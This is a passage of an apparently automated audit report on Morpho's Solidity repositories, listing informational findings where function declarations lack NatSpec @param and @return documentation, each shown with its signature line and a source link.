[7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L7), [8](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L8), [9](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L9), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L11), [12](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L12), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L13), [14](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L14), [16](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L16), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L17), [24](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L24), [25](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L25), [26](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L26), [27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/interfaces/IWstEth.sol#L27)

```solidity
File: morpho-blue-bundlers/src/migration/AaveV2MigrationBundler.sol

/// @audit missed @param (wstEth)
29:     constructor(address morpho, address aaveV2Pool, address wstEth) MigrationBundler(morpho) StEthBundler(wstEth) {

```

[29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/AaveV2MigrationBundler.sol#L29)

```solidity
File: morpho-blue-bundlers/src/migration/MigrationBundler.sol

/// @audit missed @param (morpho)
22:     constructor(address morpho) MorphoBundler(morpho) {}

```

[22](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/MigrationBundler.sol#L22)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IAaveV2.sol

/// @audit missed @param (reserve, aTokenAddress, stableDebtAddress, variableDebtAddress, interestRateStrategyAddress)
209:     function initReserve(

/// @audit missed @param (reserve, rateStrategyAddress)
217:     function setReserveInterestRateStrategyAddress(address reserve, address rateStrategyAddress) external;

/// @audit missed @param (reserve, configuration)
219:     function setConfiguration(address reserve, uint256 configuration) external;

/// @audit missed @param (asset, from, to, amount, balanceFromAfter, balanceToBefore)
243:     function finalizeTransfer(

/// @audit missed @param (val)
256:     function setPause(bool val) external;

```

[209](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L209), [217](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L217), [219](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L219), [243](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L243), [256](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IAaveV2.sol#L256)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICEth.sol

/// @audit missed @param (borrower)
5:     function repayBorrowBehalf(address borrower) external payable;

/// @audit missed @param ()
7:     function balanceOf(address) external view returns (uint256);

/// @audit missed @param (redeemTokens)
11:     function redeem(uint256 redeemTokens) external returns (uint256);

/// @audit missed @param (redeemAmount)
13:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

/// @audit missed @param (borrowAmount)
15:     function borrow(uint256 borrowAmount) external returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L5), [7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L7), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICEth.sol#L15)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICToken.sol

/// @audit missed @param ()
7:     function balanceOf(address) external view returns (uint256);

/// @audit missed @param (borrower, repayAmount)
11:     function repayBorrowBehalf(address borrower, uint256 repayAmount) external returns (uint256);

/// @audit missed @param (redeemTokens)
13:     function redeem(uint256 redeemTokens) external returns (uint256);

/// @audit missed @param (redeemAmount)
15:     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

/// @audit missed @param (borrowAmount)
17:     function borrow(uint256 borrowAmount) external returns (uint256);

/// @audit missed @param (mintAmount)
19:     function mint(uint256 mintAmount) external returns (uint256);

```

[7](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L7), [11](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L11), [13](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L13), [15](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L15), [17](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L17), [19](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICToken.sol#L19)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/ICompoundV3.sol

/// @audit missed @param (account, asset)
27:     function userCollateral(address account, address asset) external view returns (uint256);

/// @audit missed @param (account)
29:     function balanceOf(address account) external view returns (uint256);

/// @audit missed @param (account)
31:     function borrowBalanceOf(address account) external view returns (uint256);

/// @audit missed @param (asset, amount)
33:     function supply(address asset, uint256 amount) external;

/// @audit missed @param (dst, asset, amount)
35:     function supplyTo(address dst, address asset, uint256 amount) external;

/// @audit missed @param (from, dst, asset, amount)
37:     function supplyFrom(address from, address dst, address asset, uint256 amount) external;

/// @audit missed @param (asset, amount)
39:     function withdraw(address asset, uint256 amount) external;

/// @audit missed @param (src, to, asset, amount)
41:     function withdrawFrom(address src, address to, address asset, uint256 amount) external;

/// @audit missed @param (owner, manager, isAllowed, nonce, expiry, v, r, s)
43:     function allowBySig(

```

[27](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L27), [29](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L29), [31](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L31), [33](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L33), [35](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L35), [37](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L37), [39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L39), [41](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L41), [43](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/ICompoundV3.sol#L43)

```solidity
File: morpho-blue-bundlers/src/migration/interfaces/IComptroller.sol

/// @audit missed @param (cTokens)
5:     function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);

```

[5](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/migration/interfaces/IComptroller.sol#L5)

```solidity
File: morpho-blue-irm/src/AdaptiveCurveIrm.sol

/// @audit missed @param (marketParams, market)
94:     function borrowRateView(MarketParams memory marketParams, Market memory market) external view returns (uint256) {

/// @audit missed @param (marketParams, market)
100:     function borrowRate(MarketParams memory marketParams, Market memory market) external returns (uint256) {

/// @audit missed @param (id, market)
117:     function _borrowRate(Id id, Market memory market) private view returns (uint256, int256) {

/// @audit missed @param (_rateAtTarget, err)
175:     function _curve(int256 _rateAtTarget, int256 err) private view returns (int256) {

/// @audit missed @param (startRateAtTarget, linearAdaptation)
184:     function _newRateAtTarget(int256 startRateAtTarget, int256 linearAdaptation) private pure returns (int256) {

```

[94](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L94), [100](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L100), [117](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L117), [175](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L175), [184](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/AdaptiveCurveIrm.sol#L184)

```solidity
File: morpho-blue-irm/src/libraries/MathLib.sol

/// @audit missed @param (a, b)
13:     function wMulDown(int256 a, int256 b) internal pure returns (int256) {

/// @audit missed @param (a, b)
17:     function wDivDown(int256 a, int256 b) internal pure returns (int256) {

```

[13](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L13), [17](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/MathLib.sol#L17)

```solidity
File: morpho-blue-irm/src/libraries/UtilsLib.sol

/// @audit missed @param (x, low, high)
11:     function bound(int256 x, int256 low, int256 high) internal pure returns (int256 z) {

```

[11](https://github.com/morpho-org/morpho-blue-irm/tree/c2b1732fc332d20a001ca505aea76bd475e95ef1/src/libraries/UtilsLib.sol#L11)

```solidity
File: morpho-blue-oracles/src/interfaces/AggregatorV3Interface.sol

/// @audit missed @param (_roundId)
13:     function getRoundData(uint80 _roundId)

```

[13](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/AggregatorV3Interface.sol#L13)

```solidity
File: morpho-blue-oracles/src/interfaces/IERC4626.sol

/// @audit missed @param ()
5:     function convertToAssets(uint256) external view returns (uint256);

```

[5](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/interfaces/IERC4626.sol#L5)

```solidity
File: morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol

/// @audit missed @param (feed)
20:     function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {

/// @audit missed @param (feed)
31:     function getDecimals(AggregatorV3Interface feed) internal view returns (uint256) {

```

[20](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L20), [31](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/ChainlinkDataFeedLib.sol#L31)

```solidity
File: morpho-blue-oracles/src/libraries/VaultLib.sol

/// @audit missed @param (vault, shares)
13:     function getAssets(IERC4626 vault, uint256 shares) internal view returns (uint256) {

```

[13](https://github.com/morpho-org/morpho-blue-oracles/tree/d351d3e59b207729d785ec568ed0d2ee24498189/src/libraries/VaultLib.sol#L13)

```solidity
File: universal-rewards-distributor/src/UniversalRewardsDistributor.sol

/// @audit missed @param (newOwner)
172:     function setOwner(address newOwner) external onlyOwner {

/// @audit missed @param (newRoot, newIpfsHash)
183:     function _setRoot(bytes32 newRoot, bytes32 newIpfsHash) internal {

/// @audit missed @param (newOwner)
193:     function _setOwner(address newOwner) internal {

/// @audit missed @param (newTimelock)
200:     function _setTimelock(uint256 newTimelock) internal {

```

[172](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L172), [183](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L183), [193](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L193), [200](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L200)

```solidity
File: universal-rewards-distributor/src/interfaces/IUniversalRewardsDistributor.sol

/// @audit missed @param ()
22:     function isUpdater(address) external view returns (bool);

/// @audit missed @param (, )
23:     function claimed(address, address) external view returns (uint256);

/// @audit missed @param (newRoot, newIpfsHash)
26:     function setRoot(bytes32 newRoot, bytes32 newIpfsHash) external;

/// @audit missed @param (newTimelock)
27:     function setTimelock(uint256 newTimelock) external;

/// @audit missed @param (updater, active)
28:     function setRootUpdater(address updater, bool active) external;

/// @audit missed @param (newOwner)
30:     function setOwner(address newOwner) external;

/// @audit missed @param (newRoot, ipfsHash)
32:     function submitRoot(bytes32 newRoot, bytes32 ipfsHash) external;

/// @audit missed @param (account, reward, claimable, proof)
34:     function claim(address account, address reward, uint256 claimable, bytes32[] memory proof)

```

[22](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L22), [23](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L23), [26](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L26), [27](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L27), [28](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L28), [30](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L30), [32](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L32), [34](https://github.com/morpho-org/universal-rewards-distributor/tree/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/interfaces/IUniversalRewardsDistributor.sol#L34)




### Function declaration should include NatSpec `@return` documentation	_(duplicate of [NatSpec: Functions declarations should have @notice, @param and @return tags and NatSpec descriptions])_

**Severity:** Informational

**Context:** _(No context files were provided by the reviewer)_


*Instances (139)*:


```solidity
File: erc20-permissioned/src/ERC20PermissionedBase.sol

/// @audit missed @return
52:     function hasPermission(address account) public view virtual returns (bool) {

/// @audit missed @return
58:     function decimals() public view virtual override(ERC20, ERC20Wrapper) returns (uint8) {

```

[52](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L52), [58](https://github.com/morpho-org/erc20-permissioned/tree/5176577690da4611a2c4de7a2591d431458ffb27/src/ERC20PermissionedBase.sol#L58)

```solidity
File: metamorpho/src/MetaMorpho.sol

/// @audit missed @return
487:     function supplyQueueLength() external view returns (uint256) {

/// @audit missed @return
492:     function withdrawQueueLength() external view returns (uint256) {

/// @audit missed @return
526:     function decimals() public view override(ERC20, ERC4626) returns (uint8) {

/// @audit missed @return
531:     function maxDeposit(address) public view override returns (uint256) {

/// @audit missed @return
536:     function maxMint(address) public view override returns (uint256) {

/// @audit missed @return (assets)
545:     function maxWithdraw(address owner) public view override returns (uint256 assets) {

/// @audit missed @return
552:     function maxRedeem(address owner) public view override returns (uint256) {

/// @audit missed @return (shares)
559:     function deposit(uint256 assets, address receiver) public override returns (uint256 shares) {

/// @audit missed @return (assets)
572:     function mint(uint256 shares, address receiver) public override returns (uint256 assets) {

/// @audit missed @return (shares)
585:     function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {

/// @audit missed @return (assets)
599:     function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {

/// @audit missed @return (assets)
613:     function totalAssets() public view override returns (uint256 assets) {

/// @audit missed @return
622:     function _decimalsOffset() internal pure override returns (uint8) {

/// @audit missed @return (assets, newTotalSupply, newTotalAssets)
628:     function _maxWithdraw(address owner)

/// @audit missed @return (totalSuppliable)
642:     function _maxDeposit() internal view returns (uint256 totalSuppliable) {

/// @audit missed @return
657:     function _convertToShares(uint256 assets, Math.Rounding rounding) internal view override returns (uint256) {

/// @audit missed @return
665:     function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view override returns (uint256) {

/// @audit missed @return
673:     function _convertToSharesWithTotals(

/// @audit missed @return
684:     function _convertToAssetsWithTotals(

/// @audit missed @return
723:     function _marketParams(Id id) internal view returns (MarketParams memory) {

/// @audit missed @return (assets, shares, market)
730:     function _accruedSupplyBalance(MarketParams memory marketParams, Id id)

/// @audit missed @return
878:     function _withdrawable(

/// @audit missed @return (feeShares, newTotalAssets)
914:     function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {

```

[487](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L487), [492](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L492), [526](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L526), [531](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L531), [536](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L536), [545](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L545), [552](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L552), [559](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L559), [572](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L572), [585](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L585), [599](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L599), [613](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L613), [622](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L622), [628](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L628), [642](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L642), [657](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L657), [665](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L665), [673](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L673), [684](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L684), [723](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L723), [730](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L730), [878](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L878), [914](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L914)

```solidity
File: metamorpho/src/MetaMorphoFactory.sol

/// @audit missed @return (metaMorpho)
43:     function createMetaMorpho(

```

[43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorphoFactory.sol#L43)

```solidity
File: metamorpho/src/interfaces/IMetaMorpho.sol

/// @audit missed @return
19:     function multicall(bytes[] calldata) external returns (bytes[] memory);

/// @audit missed @return
23:     function owner() external returns (address);

/// @audit missed @return
27:     function pendingOwner() external view returns (address);

/// @audit missed @return
33:     function MORPHO() external view returns (IMorpho);

/// @audit missed @return
35:     function curator() external view returns (address);

/// @audit missed @return
36:     function isAllocator(address target) external view returns (bool);

/// @audit missed @return
37:     function guardian() external view returns (address);

/// @audit missed @return
39:     function fee() external view returns (uint96);

/// @audit missed @return
40:     function feeRecipient() external view returns (address);

/// @audit missed @return
41:     function skimRecipient() external view returns (address);

/// @audit missed @return
42:     function timelock() external view returns (uint256);

/// @audit missed @return
43:     function supplyQueue(uint256) external view returns (Id);

/// @audit missed @return
44:     function supplyQueueLength() external view returns (uint256);

/// @audit missed @return
45:     function withdrawQueue(uint256) external view returns (Id);

/// @audit missed @return
46:     function withdrawQueueLength() external view returns (uint256);

/// @audit missed @return
48:     function lastTotalAssets() external view returns (uint256);

/// @audit missed @return (cap, enabled, removableAt)
81:     function config(Id) external view returns (uint184 cap, bool enabled, uint64 removableAt);

/// @audit missed @return (guardian, validAt)
82:     function pendingGuardian() external view returns (address guardian, uint64 validAt);

/// @audit missed @return (value, validAt)
83:     function pendingCap(Id) external view returns (uint192 value, uint64 validAt);

/// @audit missed @return (value, validAt)
84:     function pendingTimelock() external view returns (uint192 value, uint64 validAt);

/// @audit missed @return
92:     function config(Id) external view returns (MarketConfig memory);

/// @audit missed @return
93:     function pendingGuardian() external view returns (PendingAddress memory);

/// @audit missed @return
94:     function pendingCap(Id) external view returns (PendingUint192 memory);

/// @audit missed @return
95:     function pendingTimelock() external view returns (PendingUint192 memory);

```

[19](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L19), [23](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L23), [27](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L27), [33](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L33), [35](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L35), [36](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L36), [37](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L37), [39](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L39), [40](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L40), [41](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L41), [42](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L42), [43](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L43), [44](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L44), [45](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L45), [46](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L46), [48](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L48), [81](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L81), [82](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L82), [83](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L83), [84](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L84), [92](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L92), [93](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L93), [94](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L94), [95](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMetaMorpho.sol#L95)

```solidity
File: metamorpho/src/interfaces/IMorphoMarketParams.sol

/// @audit missed @return (marketParams)
7:     function idToMarketParams(Id id) external view returns (MarketParams memory marketParams);

```

[7](https://github.com/morpho-org/metamorpho/tree/f4e2574029743088a8800149593fa997ab66f0f8/src/interfaces/IMorphoMarketParams.sol#L7)

```solidity
File: morpho-blue-bundlers/src/BaseBundler.sol

/// @audit missed @return
42:     function initiator() public view returns (address) {

/// @audit missed @return
87:     function _isSenderAuthorized() internal view virtual returns (bool) {

```

[42](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L42), [87](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L87)

```solidity
File: morpho-blue-bundlers/src/MorphoBundler.sol

/// @audit missed @return
279:     function _isSenderAuthorized() internal view virtual override returns (bool) {

```

[279](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/MorphoBundler.sol#L279)

```solidity
File: morpho-blue-bundlers/src/ethereum/EthereumBundler.sol

/// @audit missed @return
39:     function _isSenderAuthorized() internal view override(BaseBundler, MorphoBundler) returns (bool) {

```

[39](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/EthereumBundler.sol#L39)

```solidity
File: morpho-blue-bundlers/src/ethereum/interfaces/IDaiPermit.sol

/// @audit missed @return
6:     function nonces(address holder) external view returns (uint256);

```

[6](https://github.com/morpho-org/morpho-blue-bundlers/tree/5099e5fef9a82a500b875eb81b90c2deca1de243/src/ethereum/interfaces/IDaiPermit.sol#L6)

```solidity
File: morpho-blue-bundlers/src/interfaces/IStEth.sol

/// @audit missed @return
5:     function transferShares(address _recipient, uint256 _sharesAmount) external returns (uint256);

/// @audit missed @return
7:     function getPooledEthByShares(uint256 _sharesAmount) external view returns (uint256);

/// @audit missed @return
9:     function getSharesByPooledEth(uint256 _stEthAmount) external view returns (uint256);

/// @audit missed @return
11:     function getCurrentStakeLimit() external view returns (uint256);

/// @audit missed @return
13:     function submit(address _referral) external payable returns (uint256);

```

